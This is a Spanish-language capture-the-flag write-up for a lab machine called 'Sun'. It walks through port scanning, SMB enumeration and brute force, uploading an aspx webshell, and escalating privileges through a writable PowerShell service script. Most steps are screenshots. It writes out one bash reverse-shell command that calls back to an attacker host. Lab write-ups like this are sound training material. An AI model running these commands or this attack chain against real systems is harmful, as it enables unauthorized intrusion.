# Máquina Sun

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.144

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80,139,445,8080 -vvv -Pn 192.168.5.144

![alt text](image-2.png)


### Fuzing web

feroxbuster --url http://192.168.5.144 -w /usr/share/seclists/Discovery/Web-Content/big.txt


No se encontró nada interesante en el puerto 80 ni en el puerto 8080

### Samba

usando enum4linux

![alt text](image-3.png)

encontramos el usuario punt4n0

con nxc hacemos fuerza bruta:

![alt text](image-5.png)

![alt text](image-4.png)

revisamos los recursos compartidos por el usuario encontrado

![alt text](image-6.png)

![alt text](image-7.png)

me conecto con smbclient y me doy con la sorpresa que comparte el servidor web:

![alt text](image-8.png)

### Explotación

como tengo permiso de escritura y a la vez tengo el servidor web compartido veo las cabeceras para ver que tipo de webshell subir.

![alt text](image-10.png)

entonces subo una webshell en aspx

![alt text](image-9.png)

me pongo en escucha con netcat

ejecuto el comando:

'bash -c "bash -i >& /dev/tcp/192.168.5.131/443 0>&1"'

![alt text](image-11.png)

![alt text](image-12.png)

encontré una contraseña y el id_rsa del usuario

![alt text](image-13.png)

usé la contraseña para conectarme por ssh con el id_rsa

![alt text](image-14.png)

### Escalar privilegios

En opt encontré el archivo service.ps1

![alt text](image-15.png)

vi los permisos que tenía

![alt text](image-16.png)

como puedo modificarlo, encontes coloqué código para reverse shell

![alt text](image-17.png)

me puse en escucha por el puerto 4444

![alt text](image-18.png)

### user.txt

![alt text](image-19.png)

### root.txt

![alt text](image-20.png)